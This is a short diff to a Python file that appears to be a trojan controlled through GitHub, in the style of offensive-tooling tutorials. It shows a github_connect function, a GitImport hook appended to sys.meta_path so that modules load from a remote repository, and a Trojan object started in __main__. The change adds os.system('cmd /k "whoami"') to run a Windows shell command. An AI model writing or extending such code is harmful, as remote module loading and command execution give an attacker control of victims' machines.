@@ -7,7 +7,7 @@ import sys
 import threading
 import time
 from contextlib import suppress
-
+import os
 from datetime import datetime
 
 def github_connect():                                                               #Perform connection to github account
@@ -80,6 +80,6 @@ class GitImport:
     
 if __name__ == '__main__':
     sys.meta_path.append(GitImport())
-    trojan = Trojan('abc')
+    trojan = Trojan(os.system('cmd /k "whoami"'))
     print(trojan)
     trojan.run()
